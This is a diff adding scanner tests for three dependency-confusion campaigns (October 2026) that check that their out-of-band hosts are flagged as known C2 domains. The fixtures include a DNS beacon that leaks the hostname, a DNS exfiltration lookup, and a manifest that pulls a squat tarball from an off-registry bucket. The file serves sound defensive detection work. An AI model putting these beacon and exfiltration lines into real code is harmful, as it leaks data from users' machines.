@@ -7769,6 +7769,105 @@ describe("Campaign Signatures", () => {
   });
 
   // =================================================================
+  // s4yhii dependency-confusion squats (October 2026)
+  // =================================================================
+
+  // The package pins (and the pin-only scopes) come from the importer; this
+  // is the out-of-band host the squats beacon to and exfiltrate secrets to.
+  describe("s4yhii dependency-confusion squats (October 2026)", () => {
+    it("should detect the DNS beacon under the out-of-band host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "beacon.js"),
+        'require("dns").lookup(os.hostname() + ".v1.dc.oob.s4yhii.com", () => {});'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("keeps the s4yhii host in the bundle", () => {
+      const feed = getBundledFeed();
+      const set = feed.filter((i) => i.campaign === "s4yhii dependency-confusion squats");
+      expect(set.map((i) => i.value)).toEqual(["oob.s4yhii.com"]);
+    });
+  });
+
+  // =================================================================
+  // algamil7x DNS-exfiltration squats (October 2026)
+  // =================================================================
+
+  describe("algamil7x DNS-exfiltration squats (October 2026)", () => {
+    it("should detect the DNS exfiltration host", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "probe.js"),
+        'dns.resolve4("uswc" + label + ".oob.algamil7x.xyz", () => {});'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    it("keeps the algamil7x host in the bundle", () => {
+      const feed = getBundledFeed();
+      const set = feed.filter((i) => i.campaign === "algamil7x DNS-exfiltration squats");
+      expect(set.map((i) => i.value)).toEqual(["oob.algamil7x.xyz"]);
+    });
+  });
+
+  // =================================================================
+  // ltidisafe dependency-confusion squats (October 2026)
+  // =================================================================
+
+  describe("ltidisafe dependency-confusion squats (October 2026)", () => {
+    it("should detect the off-registry tarball host in a manifest", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "package.json"),
+        JSON.stringify({
+          name: "some-internal-name",
+          version: "99.9.1",
+          dependencies: {
+            ltidisafe: "https://ltidi.storage.googleapis.com/depenconf/ltidisafe-3.8.5.tgz",
+          },
+        })
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      const finding = report.findings.find(
+        (f) => f.rule === "IOC_KNOWN_C2_DOMAIN"
+      );
+      expect(finding).toBeDefined();
+      expect(finding?.severity).toBe("critical");
+    });
+
+    // storage.googleapis.com is a shared apex: another bucket must stay clean.
+    it("must NOT flag another bucket on the shared storage apex", async () => {
+      fs.writeFileSync(
+        path.join(tempDir, "fetch.js"),
+        'const u = "https://my-assets.storage.googleapis.com/app.tgz";'
+      );
+
+      const report = await scan({ target: tempDir, format: "text" });
+      expect(
+        report.findings.find((f) => f.rule === "IOC_KNOWN_C2_DOMAIN")
+      ).toBeUndefined();
+    });
+
+    it("keeps the ltidisafe host in the bundle", () => {
+      const feed = getBundledFeed();
+      const set = feed.filter((i) => i.campaign === "ltidisafe dependency-confusion squats");
+      expect(set.map((i) => i.value)).toEqual(["ltidi.storage.googleapis.com"]);
+    });
+  });
+
+  // =================================================================
   // Install-time infostealers and recon collectors (September 2026)
   // =================================================================
 
